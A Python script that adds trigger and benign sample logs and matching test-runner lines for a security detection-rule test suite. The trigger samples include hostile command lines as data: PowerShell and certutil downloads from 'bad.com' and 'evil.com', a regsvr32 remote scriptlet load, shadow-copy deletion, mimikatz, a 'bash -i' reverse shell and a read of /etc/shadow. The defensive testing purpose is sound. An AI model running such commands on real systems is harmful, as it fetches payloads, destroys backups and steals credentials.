import re

new_logs = r"""    "de-ae-02/powershell-encoded": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe Get-Process"}}}\n'
    },
    "de-ae-02/powershell-download": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe (New-Object Net.WebClient).DownloadString(\'http://bad.com/payload\')"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe Write-Host"}}}\n'
    },
    "de-ae-02/schtasks-create": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"schtasks.exe /create /tn \\"malicious\\" /tr \\"cmd.exe\\" /sc onstart"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"schtasks.exe /query"}}}\n'
    },
    "de-ae-02/registry-run": {
        "trigger": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\malware"}}}\n',
        "benign": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\legit"}}}\n'
    },
    "de-ae-02/vssadmin-delete": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"vssadmin delete shadows /all /quiet"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"vssadmin list shadows"}}}\n'
    },
    "pr-aa-01/new-admin": {
        "trigger": '{"win":{"system":{"eventID":"4732","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Domain Admins"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4732","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Standard Users"}}}\n'
    },
    "pr-aa-05/rdp-port-change": {
        "trigger": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\\PortNumber"}}}\n',
        "benign": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\LegitKey"}}}\n'
    },
    "de-ae-02/wmi-event": {
        "trigger": '{"win":{"system":{"eventID":"19","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"eventType":"WmiFilterEvent","operation":"Created","filterName":"__EventFilter"}}}\n',
        "benign": '{"win":{"system":{"eventID":"19","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"eventType":"WmiFilterEvent","operation":"Deleted","filterName":"NormalFilter"}}}\n'
    },
    "de-ae-02/lsass-access": {
        "trigger": '{"win":{"system":{"eventID":"10","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","grantedAccess":"0x1010"}}}\n',
        "benign": '{"win":{"system":{"eventID":"10","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","grantedAccess":"0x1400"}}}\n'
    },
    "de-ae-02/mimikatz": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"mimikatz.exe privilege::debug"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"ping 8.8.8.8"}}}\n'
    },
    "de-cm-01/pass-the-hash": {
        "trigger": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"logonType":"9","logonProcessName":"seclogo","authenticationPackageName":"Negotiate"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"logonType":"3","logonProcessName":"NtLmSsp","authenticationPackageName":"NTLM"}}}\n'
    },
    "id-ra-03/dcsync": {
        "trigger": '{"win":{"system":{"eventID":"4662","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"properties":"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2","accessMask":"0x100"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4662","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"properties":"normal-guid","accessMask":"0x0"}}}\n'
    },
    "id-ra-03/kerberoasting": {
        "trigger": '{"win":{"system":{"eventID":"4769","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ticketOptions":"0x40810000","ticketEncryptionType":"0x17"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4769","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ticketOptions":"0x40810000","ticketEncryptionType":"0x18"}}}\n'
    },
    "de-ae-02/lockouts": {
        "trigger": '{"win":{"system":{"eventID":"4740","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ipAddress":"10.0.0.5"}}}\n'*5,
        "benign": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ipAddress":"10.0.0.5"}}}\n'
    },
    "pr-aa-05/linux-shadow": {
        "trigger": 'type=SYSCALL msg=audit(1779953406.123:466): path=/etc/shadow uid=1000 exe="/bin/cat"\n',
        "benign": 'type=SYSCALL msg=audit(1779953406.123:466): path=/etc/shadow uid=0 exe="/usr/bin/passwd"\n'
    },
    "de-ae-02/reverse-shell": {
        "trigger": 'type=SYSCALL msg=audit(1779953407.123:467): exe="bash -i"\n',
        "benign": 'type=SYSCALL msg=audit(1779953407.123:467): exe="/bin/bash"\n'
    },
    "de-ae-02/base64-cmd": {
        "trigger": 'type=SYSCALL msg=audit(1779953408.123:468): exe="base64 -d dGhpcyBpcyBhIHZlcnkgbG9uZyBzdHJpbmcgZm9yIGJhc2U2NA=="\n',
        "benign": 'type=SYSCALL msg=audit(1779953408.123:468): exe="base64 file.txt"\n'
    },
    "de-ae-03/dns-tunnel": {
        "trigger": '{"win":{"system":{"eventID":"22","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"queryName":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com"}}}\n',
        "benign": '{"win":{"system":{"eventID":"22","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"queryName":"google.com"}}}\n'
    },
    "de-ae-03/tor-exit": {
        "trigger": 'type=SYSCALL msg=audit(1779953409.123:469): dstip="known_tor_node"\n',
        "benign": 'type=SYSCALL msg=audit(1779953409.123:469): dstip="8.8.8.8"\n'
    },
    "de-ae-02/beaconing": {
        "trigger": '{"win":{"system":{"eventID":"3","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"destinationIsIpv6":"false","destinationIp":"1.2.3.4"}}}\n'*20,
        "benign": '{"win":{"system":{"eventID":"3","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"destinationIsIpv6":"false","destinationIp":"8.8.8.8"}}}\n'
    },
    "de-ae-02/certutil": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"certutil.exe -urlcache -split -f http://evil.com/payload"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"certutil.exe -hashfile"}}}\n'
    },
    "de-ae-02/regsvr32": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"regsvr32.exe legit.dll"}}}\n'
    },
    "gv-po-01/admin-hours": {
        "trigger": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Administrator"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Guest"}}}\n'
    },
    "rc-rp-01/backup-fail": {
        "trigger": 'Dec 10 14:30:00 server veeam: Backup job failed terminated unexpectedly\n',
        "benign": 'Dec 10 14:30:00 server veeam: Backup job completed successfully\n'
    }"""

runner_lines = """
run_test 100027 "tests/sample-logs/de-ae-02/powershell-encoded/trigger.log" true "PowerShell encoded command - trigger"
run_test 100027 "tests/sample-logs/de-ae-02/powershell-encoded/benign.log" false "PowerShell encoded command - benign"

run_test 100028 "tests/sample-logs/de-ae-02/powershell-download/trigger.log" true "PowerShell download - trigger"
run_test 100028 "tests/sample-logs/de-ae-02/powershell-download/benign.log" false "PowerShell download - benign"

run_test 100029 "tests/sample-logs/de-ae-02/schtasks-create/trigger.log" true "Schtasks create - trigger"
run_test 100029 "tests/sample-logs/de-ae-02/schtasks-create/benign.log" false "Schtasks create - benign"

run_test 100030 "tests/sample-logs/de-ae-02/registry-run/trigger.log" true "Registry Run key - trigger"
run_test 100030 "tests/sample-logs/de-ae-02/registry-run/benign.log" false "Registry Run key - benign"

run_test 100031 "tests/sample-logs/de-ae-02/vssadmin-delete/trigger.log" true "Vssadmin delete - trigger"
run_test 100031 "tests/sample-logs/de-ae-02/vssadmin-delete/benign.log" false "Vssadmin delete - benign"

run_test 100032 "tests/sample-logs/pr-aa-01/new-admin/trigger.log" true "New Admin - trigger"
run_test 100032 "tests/sample-logs/pr-aa-01/new-admin/benign.log" false "New Admin - benign"

run_test 100033 "tests/sample-logs/pr-aa-05/rdp-port-change/trigger.log" true "RDP Port Change - trigger"
run_test 100033 "tests/sample-logs/pr-aa-05/rdp-port-change/benign.log" false "RDP Port Change - benign"

run_test 100034 "tests/sample-logs/de-ae-02/wmi-event/trigger.log" true "WMI Event Subscription - trigger"
run_test 100034 "tests/sample-logs/de-ae-02/wmi-event/benign.log" false "WMI Event Subscription - benign"

run_test 100035 "tests/sample-logs/de-ae-02/lsass-access/trigger.log" true "LSASS Memory Access - trigger"
run_test 100035 "tests/sample-logs/de-ae-02/lsass-access/benign.log" false "LSASS Memory Access - benign"

run_test 100036 "tests/sample-logs/de-ae-02/mimikatz/trigger.log" true "Mimikatz - trigger"
run_test 100036 "tests/sample-logs/de-ae-02/mimikatz/benign.log" false "Mimikatz - benign"

run_test 100037 "tests/sample-logs/de-cm-01/pass-the-hash/trigger.log" true "Pass-the-Hash - trigger"
run_test 100037 "tests/sample-logs/de-cm-01/pass-the-hash/benign.log" false "Pass-the-Hash - benign"

run_test 100038 "tests/sample-logs/id-ra-03/dcsync/trigger.log" true "DCSync - trigger"
run_test 100038 "tests/sample-logs/id-ra-03/dcsync/benign.log" false "DCSync - benign"

run_test 100039 "tests/sample-logs/id-ra-03/kerberoasting/trigger.log" true "Kerberoasting - trigger"
run_test 100039 "tests/sample-logs/id-ra-03/kerberoasting/benign.log" false "Kerberoasting - benign"

run_test 100040 "tests/sample-logs/de-ae-02/lockouts/trigger.log" true "Multiple Lockouts (100040 helper) - trigger"
run_test 100040 "tests/sample-logs/de-ae-02/lockouts/benign.log" false "Multiple Lockouts - benign"

run_test 100041 "tests/sample-logs/pr-aa-05/linux-shadow/trigger.log" true "Linux Shadow Read - trigger"
run_test 100041 "tests/sample-logs/pr-aa-05/linux-shadow/benign.log" false "Linux Shadow Read - benign"

run_test 100042 "tests/sample-logs/de-ae-02/reverse-shell/trigger.log" true "Reverse Shell - trigger"
run_test 100042 "tests/sample-logs/de-ae-02/reverse-shell/benign.log" false "Reverse Shell - benign"

run_test 100043 "tests/sample-logs/de-ae-02/base64-cmd/trigger.log" true "Base64 Command - trigger"
run_test 100043 "tests/sample-logs/de-ae-02/base64-cmd/benign.log" false "Base64 Command - benign"

run_test 100044 "tests/sample-logs/de-ae-03/dns-tunnel/trigger.log" true "DNS Tunnel - trigger"
run_test 100044 "tests/sample-logs/de-ae-03/dns-tunnel/benign.log" false "DNS Tunnel - benign"

run_test 100045 "tests/sample-logs/de-ae-03/tor-exit/trigger.log" true "TOR Exit Node - trigger"
run_test 100045 "tests/sample-logs/de-ae-03/tor-exit/benign.log" false "TOR Exit Node - benign"

run_test 100054 "tests/sample-logs/de-ae-02/beaconing/trigger.log" true "Beaconing (100054 helper) - trigger"
run_test 100046 "tests/sample-logs/de-ae-02/beaconing/benign.log" false "Beaconing - benign"

run_test 100047 "tests/sample-logs/de-ae-02/certutil/trigger.log" true "Certutil - trigger"
run_test 100047 "tests/sample-logs/de-ae-02/certutil/benign.log" false "Certutil - benign"

run_test 100048 "tests/sample-logs/de-ae-02/regsvr32/trigger.log" true "Regsvr32 - trigger"
run_test 100048 "tests/sample-logs/de-ae-02/regsvr32/benign.log" false "Regsvr32 - benign"

current_hour=$(date +%H)
if [ "$current_hour" -lt 6 ] || [ "$current_hour" -ge 18 ]; then
  run_test 100049 "tests/sample-logs/gv-po-01/admin-hours/trigger.log" true "Admin Hours - trigger (outside business hours)"
else
  run_test 100049 "tests/sample-logs/gv-po-01/admin-hours/trigger.log" false "Admin Hours - trigger (during business hours, expected silent)"
fi
run_test 100049 "tests/sample-logs/gv-po-01/admin-hours/benign.log" false "Admin Hours - benign"

run_test 100050 "tests/sample-logs/rc-rp-01/backup-fail/trigger.log" true "Backup Failure - trigger"
run_test 100050 "tests/sample-logs/rc-rp-01/backup-fail/benign.log" false "Backup Failure - benign"
"""

# Update create_logs.py
with open("tests/create_logs.py", "r", encoding="utf-8") as f:
    content = f.read()

# Insert new logs before the closing brace of log_definitions
if "de-ae-02/powershell-encoded" not in content:
    old_marker = "    }\n}\n\n# Write files"
    if old_marker in content:
        new_marker = "    },\n" + new_logs + "\n}\n\n# Write files"
        updated_content = content.replace(old_marker, new_marker)
        with open("tests/create_logs.py", "w", encoding="utf-8", newline='\n') as f:
            f.write(updated_content)
        print("[OK] Updated create_logs.py")
    else:
        print("[FAIL] Could not find injection point in create_logs.py")

# Update test-runner.sh
with open("tests/test-runner.sh", "r", encoding="utf-8") as f:
    content = f.read()

if "100027" not in content:
    pos = content.rfind('echo ""\necho "--- Batch 6 Additions ---"')
    if pos != -1:
        updated_content = content[:pos] + runner_lines + "\n" + content[pos:]
        with open("tests/test-runner.sh", "w", encoding="utf-8", newline='\n') as f:
            f.write(updated_content)
        print("[OK] Updated test-runner.sh")
    else:
        print("[FAIL] Could not find injection point in test-runner.sh")
